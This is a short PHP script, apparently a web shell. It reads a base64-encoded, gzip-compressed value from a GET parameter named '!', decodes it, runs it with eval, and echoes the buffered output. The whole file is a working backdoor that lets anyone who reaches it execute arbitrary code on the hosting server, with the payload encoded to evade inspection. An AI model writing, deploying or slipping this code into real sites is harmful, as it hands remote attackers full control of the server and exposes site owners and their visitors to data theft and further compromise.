<?php
function showcode($raw){
	$c = gzinflate(base64_decode($raw));
	ob_get_contents();
	ob_end_clean();
	ob_start();
	eval("?>".$c);
	$s_res = ob_get_contents();
	ob_end_clean();
	echo $s_res;
	die();	
}


if(isset($_GET['!'])) 
    showcode($_GET['!']);

exit;
?>